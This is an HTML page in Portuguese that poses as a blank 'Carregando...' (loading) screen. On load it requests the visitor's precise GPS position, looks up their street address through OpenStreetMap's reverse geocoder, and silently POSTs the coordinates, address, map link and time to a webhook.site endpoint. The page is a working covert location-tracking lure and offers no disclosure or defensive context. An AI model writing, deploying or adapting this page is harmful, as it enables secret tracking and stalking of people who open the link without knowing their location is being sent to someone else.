<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        body { background-color: #ffffff; margin: 0; padding: 0; }
    </style>
</head>
<body>
    <script>
        const URL_DO_WEBHOOK = "https://webhook.site/b2865f9e-7dce-463e-ba3d-13e739fa2ea6"; 

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(processarLocalizacao, showError, {
                    enableHighAccuracy: true,
                    timeout: 10000 // Cancela se o GPS demorar mais de 10 segundos
                });
            }
        };

        function processarLocalizacao(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const precisao = position.coords.accuracy;

            // Prepara os dados básicos garantidos
            let pacote = {
                latitude: lat,
                longitude: lon,
                margem_erro_metros: precisao.toFixed(2),
                link_maps: `https://www.google.com/maps?q=${lat},${lon}`,
                horario: new Date().toLocaleString()
            };

            const urlGeocoding = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;

            // Tenta buscar a rua
            fetch(urlGeocoding, { headers: { "Accept-Language": "pt-BR" } })
                .then(resposta => resposta.json())
                .then(dadosGeocoding => {
                    const endereco = dadosGeocoding.address || {};
                    pacote.rua = endereco.road || "Não identificada";
                    pacote.numero = endereco.house_number || "Sem número";
                    pacote.bairro = endereco.suburb || endereco.neighbourhood || "Não identificado";
                    pacote.cidade = endereco.city || endereco.town || endereco.village || "Não identificada";
                    
                    enviarParaWebhook(pacote); // Envia com a rua
                })
                .catch(error => {
                    pacote.erro_rua = "Falha ao buscar nome da rua, mas GPS funcionou.";
                    enviarParaWebhook(pacote); // Envia só com o GPS mesmo se a rua falhar
                });
        }

        // Função separada que garante o envio do POST
        function enviarParaWebhook(dados) {
            fetch(URL_DO_WEBHOOK, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(dados)
            }).catch(e => console.error("Erro no Webhook"));
        }

        function showError(error) {
            console.error("Falha ao obter localização:", error);
        }
    </script>
</body>
</html>
